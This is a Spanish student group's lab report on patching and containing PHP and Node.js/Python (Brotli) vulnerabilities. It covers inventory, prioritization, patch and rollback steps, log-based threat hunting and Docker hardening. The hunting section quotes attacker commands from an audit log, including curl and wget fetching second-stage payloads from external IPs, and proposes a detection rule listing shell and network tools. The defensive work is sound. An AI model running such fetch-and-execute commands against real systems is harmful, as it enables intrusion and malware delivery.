# Entregable — TP PHP2Shell / Node2Shell

**Grupo:** Grupo 08 · **Fork del grupo:** goys-2026-tp-vulnerabilidades · **Rama:** `grupo-08`
**Fecha:** jueves 29/10/2026

| Integrante | Usuario de GitHub | Rol en el TP |
|---|---|---|
|**Ulises Mateo Bucchino** | ulisesutnfrlp7 | **Cambios/Parche** | 
| **Jano Stratakis** | janostra | **Detección** | 
| **Valentín Garzaniti** | Vgarzaniti | **Contención/Comunicación** | 
| **Sofía Belén Raggi** | 71l0 | **Inventario** | 

> Roles sugeridos: inventario, cambios/parche, detección, contención/comunicación.
> Todos tienen que poder explicar su parte y una parte ajena.

---

## 1. Inventario

| Activo | Versión | ¿Expuesto a Internet? | ¿Procesa contenido no confiable? | ¿Afectado? | Evidencia | Justificacion |
|--------|---------|:---------------------:|:--------------------------------:|:----------:|-----------|---------------|
| Portal PHP | PHP 8.3.35 | No (80/tcp) | Si* | Si | Inventario PHP; contenedor php-lab, puerto interno 80/tcp, sin publicación visible en Docker.| PHP 8.3.35 es anterior a la versión corregida 8.3.36 para PHP2Shell.|
| API Node.js | Node.js 22.23.3 | No (3000/tcp) | Si* | Si | Inventario Node.js; contenedor node-lab, puerto interno 3000/tcp, sin publicación visible en Docker.| Node.js 22.23.3 es anterior a 22.23.4, que corrige CVE-2026-111497.|
| Servicio Python | Python 3.11.18 | No (8000/tcp) | Si* | Si | Inventario Python; contenedor py-lab, puerto interno 8000/tcp, sin publicación visible en Docker.| Brotli 1.0.9 está dentro del rango vulnerable de CVE-2026-111497; `py-lab/app.py` descomprime con `brotli.decompress` los cuerpos POST con `Content-Encoding: br`, por lo que el servicio sí usa el decoder con entradas no confiables.|

(La evidencia de los valores se encuentran en [`/capturas/tramo_1_inventario`](./capturas/tramo_1_inventario/))

**Supuestos de exposición:** _¿qué asumieron sobre el proxy, la red y el despliegue?_

Para evaluar la exposicion de los servicios del laboratorio, asumimos lo siguiente:

- **Proxy Inverso**: se considera que no existe un proxy inverso (ejemplo: Nginx o Traefik) ni un balanceador que publique los servicios PHP, Node.js o Python hacia Internet.
- **Red**: los tres servicios se ejecutan en una red aislada de Docker. No se identificaron puertos publicados directamente en el host en la salida de `docker ps --format "table {{.Names}}\t{{.Ports}}"`, por lo tanto consideramos que esta evidencia es consistente con respecto al aislamiento previsto, aunque no descarta por sí sola otras vías de acceso.
- **Despliegue**: los contenedores php-lab, node-lab y py-lab se consideran servicios de laboratorio, sin publicación externa, conforme a la consigna de la práctica.
- **Alcance de la evaluación**: la ausencia de exposición directa a Internet no se interpreta como ausencia de vulnerabilidad. Los servicios se evalúan según las versiones instaladas, las dependencias utilizadas y el procesamiento de contenido no confiable.
- **Limitaciones**: estos supuestos se basan en la arquitectura declarada por la consigna y en la evidencia disponible. No se afirma que se haya verificado exhaustivamente la configuración de red, las reglas de firewall ni la existencia de rutas alternativas de acceso.

En consecuencia, los tres servicios se consideran no expuestos directamente a Internet en el escenario evaluado, sin descartar que la evaluación deba actualizarse si se incorpora un proxy, se publican puertos o cambia la arquitectura de despliegue.

---

## 2. Priorización y decisión

| Activo | CVSS | Explotación real | Exposición | Criticidad | Decisión y plazo |
|--------|:----:|:----------------:|:----------:|:----------:|------------------|
| Portal PHP | Alta (RCE vía `session.upload_progress`) | Sí — técnica conocida en PHP < 8.3.36 | No — red interna del laboratorio | Alta | Mitigar ya (`session.upload_progress.enabled = 0`) + parchear a 8.3.36 en el día |
| API Node.js | Media (brotli / runtime) | No confirmada | No — red interna del laboratorio | Media | Parchear a Node 22.23.4 en el día; revisar dependencias brotli |
| Servicio Python | Media (brotli 1.0.9 → 1.2.1) | No confirmada | No — red interna del laboratorio | Media | Actualizar a Python con brotli 1.2.1 en el día |

**Justificación:** el Portal PHP es el activo más crítico porque `session.upload_progress.enabled=1` es explotable para RCE en versiones anteriores a 8.3.36, y el estado inicial del laboratorio (`laboratorio/php/php.ini` antes del commit `524c95f`) tenía el valor en `1`; el inventario actual ya muestra `0` porque la mitigación se aplicó el 28/10. Se prioriza la mitigación inmediata (deshabilitar el progreso de subida) y el parche de versión el mismo día. Node y Python se tratan con menor prioridad por no tener explotación real confirmada en el entorno y por estar en red aislada, pero se parchean igual para reducir superficie. La evidencia nueva que cambiaría la decisión sería confirmar exposición pública de alguno de los servicios (puertos publicados en `docker-compose.yml`), lo que subiría la criticidad de todos.

---

## 3. Mitigación, parche y reversión

| Fecha/hora | Activo | Cambio | Antes | Después | Reversión |
|------------|--------|--------|-------|---------|-----------|
| 28/10/2026 15:25 (commit `524c95f`) | Portal PHP | Mitigación `session.upload_progress.enabled` | `1` | `0` | `git revert 524c95f` (o volver la directiva a `1` en `php.ini`) y `docker compose restart php-lab` |
| 29/10/2026 (`./scripts/parchear.sh`) | Portal PHP | Parche de versión | PHP 8.3.35 | PHP 8.3.36 | Volver a tag anterior con `PHP_TAG` en `versions.env` y `docker compose up` |
| 29/10/2026 (`./scripts/parchear.sh`) | API Node.js | Parche de versión | Node v22.23.3 | Node v22.23.4 | Volver a tag anterior con `NODE_TAG` en `versions.env` |
| 29/10/2026 (`./scripts/parchear.sh`) | Servicio Python | Parche de versión (brotli) | brotli 1.0.9 | brotli 1.2.1 | Volver a tag anterior de imagen Python |

**Prueba funcional mínima:** después del parche, `docker compose ps` muestra `php-lab` (8.3.36), `node-lab` (22.23.4) y `py-lab` (brotli 1.2.1) en estado `healthy`; además, una petición `GET /` devolvió una respuesta válida en los tres (PHP 1093 bytes, Node HTTP 200, Python HTTP 200) y `ini_get("session.upload_progress.enabled")` devolvió `0`. Capturas en [`/capturas/tramo_2_cambiosyParche`](./capturas/tramo_2_cambiosyParche/).

**Nota sobre Node:** el inventario sigue informando `brotli 1.1.0` después del parche porque el decoder lo aporta el runtime; el parche de Node cambia la versión del runtime (22.23.3 → 22.23.4), pero el script no muestra un cambio en `process.versions.brotli`, por lo que no se afirma que esa versión haya cambiado.

**Probado vs planeado:** *probado* en el laboratorio: inventario antes y después del parche, mitigación de PHP, `parchear.sh`, respuesta de los 3 servicios, `SIN SALIDA` en los 3 y la caza sobre `audit.log`. *Planeado y no aplicado*: rechazo de `Content-Encoding: br` en el borde o la app, y la regla de detección para Node.js (se razonó sobre el log, no se cargó en un motor de detección).

**Qué no se pudo probar:** Acceso real desde red externa (no hay salida a Internet ni proxy público en el laboratorio isolado), por lo que no se validó exposición a Internet ni ataque activo contra el puerto publicado.

**Evidencia (outputs):**

Mitigación PHP:
```
$ docker compose restart php-lab
$ docker compose exec -T php-lab php -r 'echo ini_get("session.upload_progress.enabled");'
0
```

Parche (`./scripts/parchear.sh`):
```
== Versiones después del parche ==
=== PHP ===
PHP 8.3.36 (cli) (built: Oct 28 2026 01:26:59) (NTS)
session.upload_progress.enabled=0
=== Node.js ===
v22.23.4 / brotli 1.1.0
-- dependencias con brotli:
(sin paquete brotli externo: lo aporta el runtime)
=== Python ===
python 3.11.18
brotli 1.2.1
```

---

## 4. Detección y caza

**Hipótesis:** un proceso de aplicación (`apache2`, `node` o `python`) lanza como hijo `sh`, `bash`, `curl` o `wget` entre las 09:40Z y las 09:50Z del 27/10/2026, y en `audit.log` debería verse el par padre → hijo.

**Hallazgos en `audit.log`:**

| Línea / timestamp | Host | Padre → hijo | ¿Anómalo? | Por qué |
|-------------------|------|--------------|:---------:|---------|
| L6 · 09:42:17Z | web01 | `apache2` → `sh -c id` | Sí | Un worker web no lanza shells; reconocimiento. |
| L9 · 09:43:03Z | api01 | `node` → `sh -c curl http://198.51.100.7/x` | Sí | Descarga desde IP externa (segunda etapa). |
| L14 · 09:44:22Z | web01 | `apache2` → `wget http://198.51.100.9/a` | Sí | Descarga desde otra IP externa. |
| L16 · 09:45:10Z | svc01 | `python` → `sh -c uname -a` | Sí | Reconocimiento del sistema. |
| L8, L13, L21 | db01 | `sshd` → `bash` | No (probable) | Sesión SSH administrativa; falso positivo. |

**¿Hay compromiso?** Sí en `web01`, `api01` y `svc01` (ejecución de comandos en L6, L9, L14, L16). Indeterminado si las descargas se completaron: el log no registra resultado de red.

**Regla propuesta para Node.js:** observa la creación de procesos con `ppid_comm=node` y alerta si `comm ∈ {sh, bash, curl, wget, nc}`. Falso negativo: ejecución dentro del propio proceso `node` sin proceso hijo, o uso de otros binarios (`python`, `perl`, `socat`).

**Limitaciones del log:** no registra usuario, IP de origen ni resultado de los comandos; cubre ~10 minutos; sin telemetría de red ni archivos; `detectar.sh` solo muestra hijos directos de la app y omite `id` y `uname`.

Evidencia: [`capturas/tramo_3_deteccion/`](./capturas/tramo_3_deteccion/) (salida de `./scripts/detectar.sh`). Detalle completo en [`deteccion.md`](./deteccion.md).

---

## 5. Contención

| Control | Configuración | Evidencia | ¿Funciona? | Daño que evita y riesgo residual |
|---------|---------------|-----------|:----------:|----------------------------------|
| Red sin salida | `networks.labnet.internal: true` | `docker compose config` y `./scripts/verificar-contencion.sh` (`SIN SALIDA` en los 3 contenedores) | Sí | Impide que una RCE descargue una segunda etapa (`curl`/`wget`) o exfiltre datos hacia Internet. **Riesgo residual:** permite movimiento lateral entre `php-lab`, `node-lab` y `py-lab` dentro de `labnet`. |
| Usuario sin privilegios | `user: node` (`node-lab`), `user: nobody` (`py-lab`), workers `www-data` en Apache (`php-lab`) | `docker compose config` y árbol de procesos con `docker top` | Sí | Evita que la ejecución de código ocurra directamente como `root` en `node-lab` y `py-lab`. **Riesgo residual:** en `php-lab` el proceso maestro de Apache inicia como `root` para hacer bind al puerto 80. |
| Filesystem read-only | `read_only: true` + `tmpfs` (`/tmp`, `/var/run/apache2`, `/var/lock/apache2`, `/var/log/apache2`) y volúmenes `:ro` | `docker compose config` (`read_only: true` en los 3 servicios y montajes `:ro`) | Sí | Impide modificar el código de la aplicación, alterar binarios del sistema o dejar persistencia en disco. **Riesgo residual:** un atacante aún puede escribir artefactos temporales en memoria dentro de `/tmp` (`tmpfs`) mientras el contenedor no se reinicie. |
| Capabilities mínimas | `cap_drop: ALL` y `security_opt: no-new-privileges:true` (en `php-lab` solo se agregan `CHOWN`, `SETUID`, `SETGID`, `DAC_OVERRIDE`, `NET_BIND_SERVICE`) | `docker compose config` | Sí | Bloquea escalada de privilegios por binarios SUID, carga de módulos o manipulación de red del contenedor. **Riesgo residual:** `php-lab` conserva `DAC_OVERRIDE` y `SETUID`/`SETGID` requeridas por el proceso maestro de Apache. |
| Límites de memoria/PIDs | `mem_limit: 256m` y `pids_limit: 100` (`php-lab`, `node-lab`); `mem_limit: 128m` y `pids_limit: 50` (`py-lab`) | `docker compose config` (`268435456` / `134217728` bytes y límites de PIDs) | Sí | Evita que una condición OOM repetida (PHP2Shell), una bomba de descompresión Brotli o un fork bomb agoten los recursos del host. **Riesgo residual:** un ataque sostenido puede provocar denegación de servicio dentro del propio contenedor afectado. |
| Rechazo de Brotli innecesario | Validación de `Content-Encoding: br` en `node/server.js` (`/decode`) y `python/app.py` | No aplicado por defecto en el laboratorio (los servicios aceptan y descomprimen `br`) | No (control adicional propuesto) | Bloquear o rechazar `Content-Encoding: br` en el borde o en la app cuando no es indispensable elimina la superficie de CVE-2026-111497 sin esperar el parche del runtime. |

(La evidencia de la ejecución se encuentra en [`/capturas/tramo_4_contencion`](./capturas/tramo_4_contencion/))

**Prueba de salida a Internet:** los tres servicios (`php-lab`, `node-lab` y `py-lab`) arrojaron `SIN SALIDA` al intentar conectar hacia `example.com`, confirmando que la red `labnet` (`internal: true`) bloquea las conexiones salientes.

**Evidencia (outputs):**

Ejecución de `./scripts/verificar-contencion.sh`:
```
$ ./scripts/verificar-contencion.sh
== Controles declarados en el compose ==
    cap_drop:
    mem_limit: "268435456"
    read_only: true
    cap_drop:
    mem_limit: "268435456"
    read_only: true
        read_only: true
        read_only: true
    cap_drop:
    mem_limit: "134217728"
    read_only: true
    internal: true

== Prueba de salida a Internet (debe fallar) ==
-- PHP:
SIN SALIDA
-- Node.js:
SIN SALIDA TypeError
-- Python:
SIN SALIDA URLError
```

---

## 6. Conclusión (5 líneas)

1. Automatizar desde el minuto cero la ejecución conjunta de `./scripts/inventario.sh` y `./scripts/verificar-contencion.sh` para tener en un único reporte tanto las versiones expuestas como el estado real de aislamiento de red.
2. Aplicar inmediatamente la mitigación de configuración en PHP (`session.upload_progress.enabled = 0`) y el bloqueo preventivo de `Content-Encoding: br` en los servicios que no lo necesiten antes de iniciar la recompilación de imágenes.
3. Cruzar en paralelo los eventos de creación de procesos (`audit.log`) con el estado de los contenedores en vivo (`docker top`) para descartar actividad persistente en `/tmp` antes de reiniciar servicios.
4. Definir desde el inicio un criterio único de reversión documentado (`versions.env` y control de cambios en `php.ini`) con pruebas funcionales mínimas sobre cada endpoint tras el parcheo.
5. Establecer un parte de comunicación breve cada 30 minutos para gerencia informando qué activos están contenidos, cuáles ya recibieron parche y cuál es el riesgo residual.

---

## 7. Checklist antes de entregar

- [x] El laboratorio arrancó y los 3 servicios quedaron `healthy`.
- [x] Inventario con evidencia (versión, SAPI, configuración).
- [x] Matriz con decisión y plazo.
- [x] Parche aplicado y verificado; reversión documentada.
- [x] Al menos 3 controles de contención probados.
- [x] `deteccion.md` completo.
- [x] `informe.md` individual completo.
- [x] Sin claves, tokens ni placeholders.
- [x] Repo pusheado y PR abierto.

Checklist completa: [`../docs/checklist-entrega.md`](../docs/checklist-entrega.md).
